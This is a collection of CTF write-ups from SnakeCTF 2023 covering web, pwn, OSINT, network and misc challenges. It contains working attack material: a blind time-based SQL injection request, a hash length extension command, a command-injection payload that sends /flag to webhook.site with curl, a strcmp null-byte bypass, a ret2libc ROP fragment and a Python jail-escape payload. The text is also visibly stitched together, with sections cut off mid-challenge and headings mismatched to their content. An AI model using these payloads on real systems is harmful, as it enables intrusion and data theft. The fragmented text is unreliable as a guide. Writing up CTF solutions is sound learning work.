## smartest fridge

> I love my smart fridge so much.<br><br>
> https://smartest-fridge.snakectf.org

In this warmup challenge upon entering the site there's an error message telling us that we are not a fridge! (_I sure hope we are not_)

![fridge](/assets/img/SnakeCTF_2023/web_fridge.gif)

But, for the sake of the challenge, let's try to mimic a fridge by changing our User Agent.

After a bit of searching we managed to impersonate a fridge with the following User-Agent:

```http

This challenge is written in Java using the Spring Framework. It apparently contains just an admin login form and a bot that authenticates every few seconds and retrieves the flag.

Let's look at the source; the app only contains the `/login` route and a `/auth/flag` route. This last one prints the flag only after authentication.

```java:AuthController.java
@Controller
@RequestMapping("/auth")
public class AuthController {
  @GetMapping("/helloworld")
  public String salutavaSempre() {
    return "status";
  }

  @GetMapping("/flag")
  public ResponseEntity<String> flaggavaSempre() {
    File f = new File("/flag");
    String flag;
    try {
      InputStream in = new FileInputStream(f);
      flag = new String(in.readAllBytes());
      in.close();
    } catch (Exception e) {
      flag = "PLACEHOLDER";
    }
    return new ResponseEntity<String>(flag, HttpStatus.OK);
  }
}
```

There isn't any vulnerability here; but there's something interesting in the source of the client-side website:

```js:worker.js
const setMetric = (name) => {
  fetch(`/actuator/metrics/${name}`).then(res => res.json()).then(json => {
    console.log({json});
    self.postMessage({name, value: json.measurements[0].value});
  });
};
```

The app might be using the "Spring Actuator" module to gather metrics.

```xml:pom.xml
⋮
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
⋮
```

It is indeed doing so, and furthermore it has enabled all the available endpoints; even some that maybe shouldn't be public...

```ini:application.properties
management.endpoints.web.exposure.include=*
```

```http
GET /actuator HTTP/2
Host: springbrut.snakectf.org

HTTP/2 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
⋮

{
  "_links": {
    ⋮
    "heapdump": {
      "href": "https://springbrut.snakectf.org/actuator/heapdump",
      "templated": false
    },
    ⋮
  }
}
```

```http
GET /actuator/heapdump HTTP/2
Host: springbrut.snakectf.org

HTTP/2 200 OK
Content-Type: application/octet-stream
Content-Length: 54594327
⋮
```

In the dump it's possible to find the username/password credentials: `username=admin&password=DGcZvIYwahxgqIBJyOw7Tk2WVwLKFZ4b`.

After logging in, it's just a matter of calling `/auth/flag` et voila!

Note: After solving the challenge the author confirmed us that our solution was unintended. Being the challenge in PHP, and considering the unintended solution made use of one of the many quirks PHP has, this prompts for a PHP meme.

![php being php](/assets/img/SnakeCTF_2023/phpotato-php.jpg)

Anyway, the app consists of an intricated system of lambda functions and event-based hooks that allow users to create and execute some pipelines made of instructions.

Actually, only the admin user is allowed to create and execute these pipelines; so, first step: get admin access.

The app uses a mysql database and in the codebase there are many raw queries. One of these was injectable:

```php:home.php
$handle_get = fn(&$mysqli, &$account_numbers) =>
    ($query = "SELECT * FROM numbers WHERE user_id = " . $_SESSION['id']) &&
    (isset($_GET['sort']) ?
        ($query .= " ORDER BY processed_date " . $_GET['sort'])
        : true
    ) &&
    (isset($_GET['limit']) ?
        ($query .= " LIMIT " . $_GET['limit'])
        : true
    ) &&
    (print($query)) && # added to understand the result
    ($query_result = $mysqli->query($query)) &&
    ($res = $query_result->fetch_all(MYSQLI_ASSOC)) &&
    ($account_numbers = implode(array_map($render_number, $res))
    );
```

We need to find a way to control the `sort` query parameter; as the app rewrites the URLs to make the pretty, let's first understand how it does so.

```ini:.htaccess
php_flag register_globals off

RewriteEngine on
RewriteBase /

RewriteRule ^/?$                                                        /index.php?page=home                                [L]

# TODO: FIX and make it better

RewriteRule ^(home|login|register|admin)$                               /index.php?page=$1                                  [NC,L]

RewriteRule ^(home|admin)/sort-(asc|desc)/?$                            /index.php?page=$1\&sort=$3                         [NC,L]
RewriteRule ^(home|admin)/sort-(asc|desc)/limit-([^/]+)/?$              /index.php?page=$1\&sort=$3\&limit=$4               [NC,L]

RewriteRule ^(home|admin)/p-([^/]+)/?$                                  /index.php?page=$1\&precision=$2                    [NC,L]
RewriteRule ^(home|admin)/p-([^/]+)/sort-(asc|desc)/?$                  /index.php?page=$1\&precision=$2\&sort=$3           [NC,L]
RewriteRule ^(home|admin)/p-([^/]+)/sort-(asc|desc)/limit-([^/]+)/?$    /index.php?page=$1\&precision=$2\&sort=$3\&limit=$4 [NC,L]

RewriteRule ^(home|login|register|admin)\.php$ -                                                                            [NC,F,L]
```

So it actually possible to control the `sort` parameter using the full URL as in: `/index.php?page=home&sort=PAYLOAD`

Given the injection context we opted to do a blind time-based injection to recover the `admin` password in the `users` table.

```sql:schema.sql
⋮
CREATE TABLE users
(
        id int NOT NULL AUTO_INCREMENT PRIMARY KEY,
        username varchar(255) UNIQUE,
        password varchar(255),
        is_admin boolean
);
⋮
INSERT INTO users(id, username, password, is_admin) VALUES (1, 'admin','REDACTED', true);
⋮
```

Based on the DB schema, the final injection was:

```http
GET /index.php?page=home&sort=AND+(SELECT+1+FROM+users+WHERE+username+%3d+'admin'+AND+HEX(password)+LIKE+'7734%25'+AND+SLEEP(1)) HTTP/2
Host: phpotato.snakectf.org
```

After scripting a bit we recovered the admin password: `w4GNskGHWrfmodOhtc04dphIttnBhEcT`

With the admin credentials we can access the pipeline creation process

![pipeline-creation](/assets/img/SnakeCTF_2023/phpotato-pipeline-admin.png)

Now, we'll only show how to get to our solution, not the actual intended one.

Here are the most important snippets from the source code:

To start off, the flag is defined globally as `FLAG`

```php:misc/config.php
$define_flag = fn() => define('FLAG', getenv('FLAG'));
```

Second of all, pipelines are first created with a request, and then are processed with another one. After creating a pipeline, this is the lambda function that handles requests to process them:

{:.linenumber}
```php:pages/numbers.php
$handle_post_process = fn(&$mysqli) =>
    ($stmt = $mysqli->prepare('SELECT id, num, pipeline FROM numbers WHERE user_id = ? AND id = ?')) &&
    $stmt->bind_param("ii", $_SESSION['id'], $_POST['id']) &&
    $stmt->bind_result($id, $num, $pipeline) &&
    (
        ($res = $stmt->execute()) &&
        $stmt->fetch() &&
        ($pipeline_e = explode("\n", $pipeline)) && //newline separates istructions
        ($_SESSION['pipeline']['instructions'] = array_map($parse_instruction, $pipeline_e)) &&
        (($_SESSION['pipeline']['num'] = $parse_number($num)) || $_SESSION['pipeline']['num'] == 0) &&
        ($_SESSION['pipeline']['id'] = $id) ?
        set_user_hook('start_processing')
        : set_user_hook('something_wrong')
    ) || header('Refresh:0') || exit();
```

The only important parts are lines 8-11, as `$id`, `$num`, `$pipeline` are user-controlled and are then reflected on the page.

Line 10 is especially interesting as it calls `$parse_number`:

```php:misc/pipeline.php
$parse_number = fn($num) =>
    (
    $num != '' &&
    ($num = trim($num)) &&
    ctype_digit($num) ?
    intval($num)
    : (defined($num) && $num != "FLAG" ?
        constant($num)
        : 0
    )
);
```

If `$num` is a number, it is displayed as such, otherwise the global variable with such name is returned. The only limitation is that `$num` cannot be the same as `FLAG`.

I shall remind you:

- `$num` is in our control.
- the flag is the global constant called `FLAG`.

What it's missing? Only this last php quick. It is true that we can't use `FLAG`, but what if it had some other way to be referenced?

It turns out that the [constant function](https://www.php.net/manual/en/function.constant.php) also supports classes/enum constants (`Foo::Bar`), and namespaces (`/NameSpace/Foo::Bar`). Therefore we can actually set `$num` as `/FLAG` and after processing the pipeline, the flag is shown to everyone on the board.

Unfortunately, we solved this challenge shorty after the end of the CTF; still, it was really interesting so we'll include our writeup of this one too.

This app was written in ruby using RoR and a few other modules. To get a rough idea:

```bash:Gemfile
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '3.0.6'

# Bundle edge Rails instead: gem "rails", github: "rails/rails", branch: "main"
gem 'rails', '~> 7.0.4', '>= 7.0.4.3'

# The original asset pipeline for Rails [https://github.com/rails/sprockets-rails]
gem 'sprockets-rails'

# Use sqlite3 as the database for Active Record
gem 'sqlite3', '~> 1.4'

# Use the Puma web server [https://github.com/puma/puma]
gem 'puma', '~> 5.0'

# Use Active Storage variants [https://guides.rubyonrails.org/active_storage_overview.html#transforming-images]

A carousel of 🐱 cats photos 🐱 greets us!

As the codebase is quite extended and complex, we'll skip the overview as done with previous challenges. Instead, let's go trough the steps to solve this challenge.

1. Find username of an user with admin privileges
2. Exploit `reset_submit` functionality using an Hash Length Extension attack to retrieve the admin account password
3. Exploit a command injection in the cat image preview feature to read the `/flag` file

First, the most important part is that `reset_submit` is vulnerable.

{:.linenumber}
```rb:/app/controllers/users_controller.rb
⋮
def reset_submit
    if logged_in?
      redirect_to root_path
      return
    end
    @account = User.new

    # GET
    if request.get?
      render :reset_submit
      nil
    else
      # POST
      unless User.exists?(username: params[:user][:username].last(8))
        @message = 'User not found!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      unless check(params[:user][:username], params[:user][:reset_token])
        @message = 'Wrong reset token!'
        render :reset_submit, status: :unprocessable_entity
        return
      end

      @account = User.find_by(username: params[:user][:username].last(8))
      @message = "Sorry, we're still building the application. Your current password is: " + @account.password
      render :reset_submit, status: :gone
      nil
    end
  end
⋮
```

Going bottom-up, at line 28 the password of the account with the username specified by us is printed out (Warning bell 1).

To get there, the user must exist and the `check()` function must return `True`.

It should now be clear why in the sourcecode provided the admin username was REDACTED. Later we'll check how to get this username, for now, let's finish analyzing this function at hand.

`check()` make sure that the reset_token generated for the account is the same as the one provided by us. Ideally, this token would be unique and should be sent to us by email to let us confirm our identity before revealing our password.

```rb:/app/helpers/users_helper.rb
module UsersHelper
    require 'digest'

    def cipher(username)
        generator = Digest::SHA256::new
        generator << ENV['SECRET'] + username

        return generator.hexdigest()
    end

    def check(username, token)
        generator = Digest::SHA256::new
        generator << ENV['SECRET'] + username

        return generator.hexdigest() == token
    end
end
```

`cipher()` is called somewhere else to set an account reset_token, `check()` is the one seen in the previous snippet.

This is clearly vulnerable to an [hash length extension](https://github.com/iagox86/hash_extender) attack if you have ever seen one.

Furthermore, note how in `users_controller.rb` at line 15 and 27, only the last 8 characters of our input are used, but, for checking the token the whole line is used (line 21).

Therefore an hash length extension attack seems possible as even if our input string changes (look at the repo linked above) only the last 8 chars are used, and we can control those.

The last piece thing necessary would be that the admin username has actually length 8, to make things possible and easier. Spoiler: that's exactly right!

So, let's find this username. This is quite straight-forward as the view for the route `/users/:id` reveals the username and whether the user is an admin or not.

```html:/app/views/users/show.html.erb
<% content_for :content do %>
  <% content_for :subcontent_1 do %>
    <div class="row ">
      <h4 class="card-title center-align black-text">Account information</h4>
    </div>
    <div class="row padded-lr-5">
      <label for="username" class="black-text">Username</label>
      <p class="black-text" name="username">
        <%= @account.username %>
      </p>
    </div>
    <div class="row padded-lr-5">
      <label for="admin" class="black-text">admin</label>
      <p class="black-text" name="admin">
        <%= @account.username === ENV['ADMIN_USER'] %>
      </p>
    </div>
    ⋮
```

The user with id `76` has the username, `4dm1n_54`, and is an admin.

Good, let's register an user `asdfff`, call `/reset` with both the admin username and ours to generate the reset_token, and let's perform the Hash Extension attack:

1) Get our reset_token in the Account page: `6bf6afb6be14fdf510757661524d0e9017c6907f606ffb7cd593e9dd831eacf6`

2) extend it: (the length can be seen in the docker-compose.yaml)

```shell
~$ hash-extender -d asdfff -s 6bf6afb6be14fdf510757661524d0e9017c6907f606ffb7cd593e9dd831eacf6 -a 4dm1n_54 -f sha256 -l 32

```

3) Send the reset request:

```http
POST /reset_submit HTTP/2
Host: kattinger.snakectf.org
Cookie: _kattinger_session=...
⋮

    </div>
      ⋮
```

With the credentials `4dm1n_54`:`WOQpcmueCgBuXkMHQeJd0f8XVp0cO1Px`, we can now log-in as admin.

Let's exploit the image preview feature to get the flag:

```rb:app/helpers/cats_helper.rb
module CatsHelper
    require 'curl'
    require 'rmagick'
    require 'base64'
    require 'timeout'

    include Magick

    def process_image(image_path)
        p "Processing: " + image_path
        image_path = image_path.encode!("utf-8").scrub()
        if image_path.start_with?('http') || image_path.start_with?('https')
            curl = CURL.new({:cookies_disable => false})
            curl.debug=true
            p image_path
            filename = Timeout::timeout(3) do
                curl.save!(image_path)
            end
            p filename
        else
            filename = image_path
        end
        processed = ImageList.new(image_path)
        processed = processed.solarize(100)
        result = 'data://image;base64,' + Base64.strict_encode64(processed.to_blob())
        File.unlink(filename)
        return result

    end
end
```

From trial and error, or by mostly looking at the output of our local instance, we see that the `image_path` is used with CURL library and is actually vulnerable to command injection.

`image_path` is the location that can be specified when adding a new cat to the collection. From the output we see that the actual command executed underneath by the library is the following:

`curl   --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)"    --location --compressed --silent  "OUR_IMAGE_PATH" --output "/tmp/curl/curl_0.6715324541398725_0.13914753312651085.jpg"`

Let's change the location with the following and ask for a new preview:

`https://webhook.site/YOUR_UUID/start" && curl -X POST -H "Content-Type: multipart/form-data" -F "data=@/flag" https://webhook.site/YOUR_UUID/flag && cat -- "`

# Pwn

## military grade authentication

> We just started using this military-grade software to authenticate accesses to our infrastructure.<br><br>
> We don't really understand it, but I'm sure that it's secure! We don't know the password either, after all!<br><br>
> nc pwn.snakectf.org 1337

This challenge gives us a binary file which checks for a password:

```c
if ( read(0, s1, 128uLL) <= 0 )
    err(1, "read broken lol");
  if ( !strcmp(s1, (const char *)buf) )
  {
    puts(&s);
    get_shell();
  }
```

the error is obviously in the use of strcmp, as it stops when it finds a null byte,
so to bypass the check we just need to send null bytes and the program will authenticate us as if the password is correct:

```python
r.sendline(b'\x00' * 128)
```

And we get the shell!

## obligatory bof

> Well, you gotta do what you gotta do!<br><br>
> nc pwn.snakectf.org 1338

this is the decompiled code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  buf[3] = 0LL;
  init(argc, argv, envp);
  printf("Well, just tell me what to do: ");
  read(0, buf, 256uLL);
  puts("Ok, got it!");
  return 0;
}
```

We can see that read() is vulnerable to buffer overflow, and if we look with checksec, we see that no protections are active except for NX.
Also, you can find the libc version used by checking inside the docker environment.

The way to solve this is to exploit the bof two times:
get a libc leak by printing a got address and calculate libc base address, then return to main and exploit the bof again to return to one_gadget that will call system("/bin/sh").

Here is the script:

```python
def main():
	offset = 40
	rop = ROP(exe)

	# bof to leak libc
	payload = flat(
		'A' * offset,
		p64(rop.find_gadget(['pop rdi', 'ret']).address),
		p64(exe.got.puts),
		p64(exe.plt.puts),
		p64(exe.sym.main)

## flightyflightflight

> Look mum I can fly!<br><br>
> Flag format: snakeCTF{IATAcode_ICAOcode}

We were given a video taken from inside an airplane during takeoff and tasked with finding the airport it was departing from (in particular its [IATA](https://en.wikipedia.org/wiki/IATA_airport_code) and [ICAO](https://en.wikipedia.org/wiki/ICAO_airport_code) codes). The heavy fog made recognizing the landscape impossible and there were no indicators of time and day (we estimated the runway's heading and rough time of the day through the way the sun shone on the clouds' tops, but that wasn't enough to work on), so we took a different approach.

In the first few frames another airplane can be seen rolling on an adjacent taxiway, and with a bit of effort its branding can be recognized as **Volotea**:

![Volotea airplane](/assets/img/SnakeCTF_2023/flight_1.png)

Other important details were the location of the tower and the size and shape of the gates:

![Control tower and gates (front)](/assets/img/SnakeCTF_2023/flight_2.png)
![Gates (side)](/assets/img/SnakeCTF_2023/flight_3.png)

[Volotea's website](https://www.volotea.com/en/press-room/about-us/) shows a list of airports they operate in, so it was just a matter of iterating over satellite imagery of each of them to find a matching one.

![Volotea airports list](/assets/img/SnakeCTF_2023/flight_4.png)

Finally we found a match with Venice: the heading of the runway, size and shape of the gates, control tower location, and orientation of the ramps all seemed correct.

We took like one second to understand that the symbols were a notation for a chess opening move. We took a ridiculous amount of time to find the correct attack and flag format. Looking on Google we found different names for this opening like the `Charles opening`. There was nothing very fun about the solution, we just realized that Christmas was actually useful for the search and we found the Santa Claus Opening. What did we learn with this challenge? If playing chess someone made me a Santa Claus opening I would know how to annihilate him.

In this challenge we are given an email (info.eml) that contain the message:

service information:

paste it somewhere and delete this mail after.
```

There are no strange headers to analyze so we excluded the path of email forensics analysis. At this point we focused on the sender and receiver emails: `mailacasissimopippo@gmail.com` and `wazzujf2@slimy.lol`. Using Osint tools for emails we didn't find anything interesting. Then we thought that the message of the mail could be somehow important. Maybe `wazzujf2@slimy.lol` had pasted something on the internet! We looked on Pastebin, the most popular place on internet to paste text, and we quickly found the [profile of wazzujf2](https://pastebin.com/u/wazzujf2) and its only note:

With this kind of net/forensic challenges a good place to start from is the **Protocols Hierarchy** view in Wireshark:

![protocols hierarchy](/assets/img/SnakeCTF_2023/closedwebnet_protocols.png)

After going down a useless rabbit hole with Mikrotik discovery packets (the current dissector for which appears to be broken in some way), it all suddendly made sense when we took a peek at the Resolved Addresses panel and cross-referenced it with non-TLS packets, effectively removing most of the noise that we could probably ignore:

![resolved addresses](/assets/img/SnakeCTF_2023/closedwebnet_addresses.png)

This host spoke [OpenWebNet](https://en.wikipedia.org/wiki/OpenWebNet), Bticino/Legrand's home automation protocol that was in vogue in the early 2000's. We lucked out by having a team member recognize it due to its peculiar cleartext format, but Googling some basic messages such as `*#*1##` would have also yielded some promising results. The name of the challenge was actually quite a big hint after all.

Reading these payloads isn't particularly difficult, but [a dissector](https://github.com/jotonedev/openwebnet-dissector) exists so we used it to speed up our work.

![dissected packets](/assets/img/SnakeCTF_2023/closedwebnet_dissector.png)

The description of the challenge called for a password, a model name and a firmware version. We retrieved those in reverse thanks to [various articles](http://www.pimyhome.org/wiki/index.php?title=WHO%3D13_-_Device_Communication) found on the web, since the official documentation is partially lost in time.

Here is the exchange requesting and obtaining the version, `3.1.16`:

![version message](/assets/img/SnakeCTF_2023/closedwebnet_version.png)

And the one requesting and obtaining the model, which according to the article linked above corresponds to `F452`:

![version message](/assets/img/SnakeCTF_2023/closedwebnet_version.png)

The only thing left to extract was the password, which uses [a known but annoying algorithm](https://rosettacode.org/wiki/OpenWebNet_password). We didn't fancy reversing it so, while one of us was busy writing a small bruteforcing script basing on the nonces and cyphertexts present in the capture, another team member applied Occam's razor and tried submitting the flag with the default password of `12345`. It was accepted :)

> The network was dead quiet. Yet, in the eerie silence, I could almost feel the netadmin's presence, their thoughts and intentions woven into the very fabric of the IPAM.<br><br>
> Note: nmap is allowed INSIDE the instance.

We are not given many information in this challenge just a mention to IPAM so something related to IP addresses. We noticed that the initial letters of the words in the title composed the word ping. So we firstly tried to ping some stuff in the network. We also noticed, while looking at the available bin commands, that we had nmap available (the note about it in the description had not been released yet). Looking at the result of `ip a` we can notice a "chall" network:

```shell
-bash-5.2$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: chall: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ether ce:22:7c:6f:80:a7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.0.1/23 scope global chall
       valid_lft forever preferred_lft forever
1350: eth0@if1351: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:1f:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.31.3/24 brd 172.17.31.255 scope global eth0
       valid_lft forever preferred_lft forever
```

so we decided to scan the network with `nmap -n -sn -T5 10.10.0.1/23`. We found some host up (133 out of 512) and we noticed that they were following some kind of pattern. We tried to transform the host up and down into `1` and `0` and checked if there was some kind of binary encoded message. We were really close to the solution but at this point we hopped to the part 2 of the same challenge because we thought that its hint was more clear.

When we flagged the second chall we came back on this one, with the understanding that representing addresses with some encoding was the right way to go. We tried to use different graphical representations and after many tries morse code turned out to be the right one.

```python:solve.py
points = ['0.1', '0.2', '0.119', '0.121', '0.123', '0.128', '0.129', '0.130', '0.132', '0.137', '0.139', '0.140', '0.141', '0.146', '0.147', '0.148', '0.150', '0.152', '0.153', '0.154', '0.159', '0.164', '0.165', '0.166', '0.168', '0.170', '0.171', '0.172', '0.174', '0.179', '0.180', '0.181', '0.186', '0.188', '0.190', '0.191', '0.192', '0.194', '0.199', '0.200', '0.201', '0.203', '0.205', '0.207', '0.212', '0.217', '0.222', '0.224', '0.225', '0.226', '0.228', '0.229', '0.230', '0.232', '0.237', '0.238', '0.239', '0.241', '0.243', '0.245', '0.250', '0.251', '0.252', '0.254', '0.255', '1.0', '1.2', '1.3', '1.4', '1.9', '1.10', '1.11', '1.13', '1.14', '1.15', '1.17', '1.18', '1.19', '1.24', '1.26', '1.27', '1.28', '1.30', '1.31', '1.32', '1.34', '1.39', '1.40', '1.41', '1.43', '1.44', '1.45', '1.50', '1.51', '1.52', '1.54', '1.55', '1.56', '1.58', '1.59', '1.60', '1.65', '1.67', '1.68', '1.69', '1.71', '1.76', '1.78', '1.80', '1.85', '1.90', '1.91', '1.92', '1.94', '1.96', '1.97', '1.98', '1.100', '1.105', '1.106', '1.107', '1.109', '1.110', '1.111', '1.113', '1.114', '1.115', '1.120', '1.121', '1.122', '1.124', '1.126', '1.131']

> The once-elusive netadmin's messages now resonate clearly through the wider network, their intentions revealed for all of us to see.<br><br>
> Note: nmap is allowed INSIDE the instance.

This challenge follows the same idea as the previous one, but we actually found it easier. Easier given that this challenge had an hint that somewhat pointed us in the right direction from the start unlike the other one.

The hint was an [old xkcd image](https://xkcd.com/195/).

To start off, as before, we mapped the network of IPs in the `chall` network (10.20.0.0/20) using nmap:

```shell
-bash-5.2$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: chall: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ether 86:5b:2c:ef:06:2c brd ff:ff:ff:ff:ff:ff
    inet 10.20.0.1/20 scope global chall
       valid_lft forever preferred_lft forever
1343: eth0@if1344: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:1e:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.30.3/24 brd 172.17.30.255 scope global eth0
       valid_lft forever preferred_lft forever

-bash-5.2$ nmap -n -sn -T5 10.20.0.0/20
⋮
Nmap scan report for 10.20.15.117
Host is up (0.0010s latency).
⋮
```

So, we had the idea of plotting the IPs in a grid using the hilbert curve pattern shown in the XKCD. Black square if the host is up, white if it's not.

Having 4096 IPs, we used an algorithm that generated a hilbert curve of order 6 (?), which could be represented in a 64x64 grid.

Then it was a matter of parsing the nmap data and writing a plotter that actually worked.

It's seems trivial explained like this, but it actually took as quite a few hours (👀 and the OpenAI's power 👀) to get this right.

So, here's the final script:

```python
import matplotlib.patches as patches
import matplotlib as plt
import matplotlib.pyplot as plt
import numpy as np

def hilbert_curve(order):
    """
    Generate Hilbert curve coordinates for a given order.
    """
    def step(index):
        """
        Generate a single step in the Hilbert curve, using the binary representation of 'index'.
        """
        x, y = 0, 0
        s = 1
        while s < 2**order:
            rx = 1 & (index // 2)
            ry = 1 & (index ^ rx)
            x, y = rotate(s, x, y, rx, ry)
            x += s * rx
            y += s * ry
            index //= 4
            s *= 2
        return x, y

    def rotate(n, x, y, rx, ry):
        """
        Rotate/flip a quadrant appropriately.
        """
        if ry == 0:
            if rx == 1:
                x = n - 1 - x
                y = n - 1 - y
            return y, x
        return x, y

    return [step(i) for i in range(2**(order * 2))]


def draw_hilbert_pattern(array, order):
    """
    Draw a grid of blocks following the Hilbert curve pattern, coloring blocks based on the given array.
    """
    # Generate the Hilbert curve points
    hilbert_points = hilbert_curve(order)

    # Prepare the figure and axis
    fig, ax = plt.subplots(figsize=(8, 8))
    ax.set_xlim(0, 2**order)
    ax.set_ylim(0, 2**order)
    ax.set_aspect('equal', adjustable='box')
    ax.axis('off')

    # Draw each block
    block_size = 1
    for index, point in enumerate(hilbert_points):
        if index < len(array) and array[index]:
            rect = patches.Rectangle(point, block_size, block_size, linewidth=1, edgecolor='none', facecolor='black')
            ax.add_patch(rect)

    plt.title(f'Hilbert Pattern for Order {order}')
    plt.show()

# list with booleans that indicates if the relevant host is up or not.
# given an ip 10.20.x.y -> index = x*256 + y
values = [False, True, True, False, ...]

assert len(values) == 4096

# Draw the grid
draw_hilbert_pattern(np.array(values), 6)

## black rat

> I intercepted something weird, are we under attack? Should we be scared? Is this a prank? Please check and let me know

The PCAP we were given contained only USB packets (no need to dig through random noise, that's a good start! ...Maybe?) and, jumping straight to the juicy part, it seemed that the bulk of the data was being carried through URB interrupts in the form of HID payloads. There was just one problem, though: we were used to seeing HID payloads with a length of 8 bytes while these only contained 4 bytes, so our usual techniques and tools were not yielding any meaningful result.

![4-bytes HID payloads](/assets/img/SnakeCTF_2023/blackrat_4bytes.png)

After digging through the obscure [USB specs](https://www.usb.org/sites/default/files/hut1_4.pdf) (and discovering that the HID standard contains specific handlers for "Tank Simulation" and "Pinball" devices, cool), we noticed that the device that was generating the most interrupts initially identified itself as an optical mouse.

![Noisy device descriptors](/assets/img/SnakeCTF_2023/blackrat_descriptors.png)

This explained the difference in the payload size: keyboards send 8-bytes ones and mice (hence the "rat" in the name of the challenge, probably) only 4 (source [1](https://wiki.osdev.org/USB_Human_Interface_Devices#USB_mouse), [2](https://github.com/mahaloz/ctf-wiki-en/blob/c680934c117f9bd50d74b72c99c97d918942cd2e/docs/misc/traffic/protocols/USB.md#mouse), [3](https://ctftime.org/writeup/24540)):

| Byte | Meaning |
| --- | :--- |
| 1st | Button presses (`0x00` for none, `0x01` for left, `0x02` for right) |
| 2nd | Horizontal movement since last report (>0 for right, <0 for left) |
| 3rd | Vertical movement since last report (>0 for up, <0 for down) |
| 4th | Unknown? |

In this one the goal is to call the get_var function to get the value of the env var FLAG. We cannot use a bunch of letters, symbols and builtins functions. So the first thing we did was to enumerate all the available things that we had:

```plaintext
Letters and symbols: a b d e f g i l m r s t v ( ) * + , . : _
Builtins: ['abs', 'all', 'delattr', 'dir', 'id', 'list', 'reversed', 'set']
```

It was also immediately clear that the F,L,A,G variables were there for a reason and had to be used. Putting things together made us realize that the dir function can be useful to get a list of symbols. `dir(self)` returned this list:

```python
['A', 'F', 'G', 'L', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'get_var', 'run_code']
```

So we had a list with the letters we needed to compose the word "FLAG", we just needed to find a way to get elements of it without using `[]`. The `__getitem__` function came in handy for that purpose. The last thing we needed was a way to create integer indexes (from 0 to 3) to get the letters from the list. We tried for a second to look for a fancy solution and then we immediately gave up and found the ugliest solution possible:

```python
all(dir(list)).real # = 1
all(dir(list)).real.__gt__( all(dir(list)).real).real # = 0
```

Putting everything together turned into this beautiful payload:

```python
self.get_var((dir(self).__getitem__(all(dir(list)).real)) + (dir(self).__getitem__(( all(dir(list)).real + all(dir(list)).real + all(dir(list)).real ))) + (dir(self).__getitem__(all(dir(list)).real.__gt__( all(dir(list)).real).real)) + (dir(self).__getitem__(( all(dir(list)).real + all(dir(list)).real ))))
```

Was is the best solution? Probably not. Did we care about it? Not at all.
